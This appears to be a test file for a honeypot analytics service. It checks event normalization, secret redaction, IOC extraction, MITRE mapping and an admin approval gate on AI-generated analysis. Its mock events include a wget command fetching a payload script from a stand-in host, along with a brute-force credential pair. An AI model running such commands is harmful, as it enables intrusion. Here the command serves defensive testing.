const assert = require('assert');
const { createTpotService, getConfigFromEnv, normalizeEvent, sanitizeRecord, extractIocsFromEvents, mapMitre } = require('../tpotService');

const mockEvents = [
  { '@timestamp': '2026-06-22T01:00:00Z', source_ip: '198.51.100.23', country: 'BR', port: 22, protocol: 'tcp', honeypot: 'cowrie', event_type: 'ssh_brute_force', username: 'root', password: 'admin123' },
  { '@timestamp': '2026-06-22T02:00:00Z', source_ip: '203.0.113.44', country: 'US', port: 23, protocol: 'tcp', honeypot: 'cowrie', event_type: 'command', command: 'wget http://example.invalid/payload.sh?token=secret123' },
  { '@timestamp': '2026-06-22T03:00:00Z', source_ip: '192.0.2.10', country: 'EC', port: 80, protocol: 'tcp', honeypot: 'suricata', event_type: 'alert', suricata_signature: 'ET SCAN Possible Nmap User-Agent Observed' },
  { '@timestamp': '2026-06-22T04:00:00Z', source_ip: '198.51.100.99', country: 'NL', port: 445, protocol: 'tcp', honeypot: 'dionaea', event_type: 'malware_capture', sha256: 'a'.repeat(64) },
  { '@timestamp': '2026-06-22T05:00:00Z', source_ip: '203.0.113.90', country: 'DE', port: 8080, protocol: 'tcp', honeypot: 'heralding', event_type: 'http_fuzzing', password: 'P@ssw0rd!demo', user_agent: 'sqlmap/1.7' },
];

const normalized = mockEvents.map(normalizeEvent);

assert.strictEqual(normalized[0].destination_port, 22, 'normalizes destination port');
assert.strictEqual(normalized[0].password_attempted_masked.startsWith('len:'), true, 'masks attempted password');

const sanitized = sanitizeRecord({ message: 'password=SuperSecret123 token=abcdef1234567890 user=a@b.com' });
assert.ok(!JSON.stringify(sanitized).includes('SuperSecret123'), 'redacts passwords');
assert.ok(!JSON.stringify(sanitized).includes('abcdef1234567890'), 'redacts tokens');
assert.ok(!JSON.stringify(sanitized).includes('a@b.com'), 'redacts emails');

const iocs = extractIocsFromEvents(normalized);
assert.ok(iocs.some((ioc) => ioc.indicator_type === 'ip'), 'extracts IP IOC');
assert.ok(iocs.some((ioc) => ioc.indicator_type === 'hash'), 'extracts hash IOC');
assert.ok(iocs.every((ioc) => ioc.indicator_value_hash), 'hashes IOC values');

const mitre = mapMitre(normalized);
assert.ok(mitre.some((item) => item.technique === 'Brute Force'), 'maps brute force');
assert.ok(mitre.some((item) => item.technique === 'Ingress Tool Transfer'), 'maps wget transfer');

async function runAsyncTests() {
  const service = createTpotService(getConfigFromEnv({ AI_OUTPUT_REQUIRES_APPROVAL: 'true' }));
  const created = await service.createAiAnalysisJob({}, { analysis_type: 'executive_summary' }, 'test-admin');
  assert.ok(created.job_id, 'creates AI job');
  await new Promise((resolve) => setTimeout(resolve, 50));
  const job = await service.getAiAnalysisJob(created.job_id);
  assert.ok(job.status === 'audited' || job.status === 'rejected' || job.status === 'running', 'job has controlled status');
  if (job.status === 'audited') {
    assert.strictEqual(job.raw_ai_output, null, 'does not expose raw result before approval');
    await service.approveAiAnalysis(created.job_id, 'test-admin');
    const approved = await service.getAiAnalysisJob(created.job_id);
    assert.ok(approved.approved_output, 'shows approved output after approval');
  }
}

runAsyncTests()
  .then(() => console.log('tpotService tests passed'))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
